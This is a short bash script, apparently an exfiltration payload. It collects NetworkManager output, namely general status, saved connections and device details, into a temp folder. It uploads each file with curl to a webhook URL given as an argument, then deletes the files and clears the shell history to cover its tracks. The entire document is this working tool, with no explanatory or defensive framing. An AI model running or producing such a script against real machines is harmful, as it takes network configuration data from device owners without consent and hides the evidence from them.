#!/bin/bash

WEBHOOK_URL=$1
TMP_FOLDER_PATH=$(mktemp -d -p "/tmp" prefix-XXXXXXXXXX)

nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"

curl -F "file=@$TMP_FOLDER_PATH/nmcli.txt" $WEBHOOK_URL
curl -F "file=@$TMP_FOLDER_PATH/nmcli_connection.txt" $WEBHOOK_URL
curl -F "file=@$TMP_FOLDER_PATH/nmcli_device.txt" $WEBHOOK_URL

rm -rf "$TMP_FOLDER_PATH"

history -c
exit
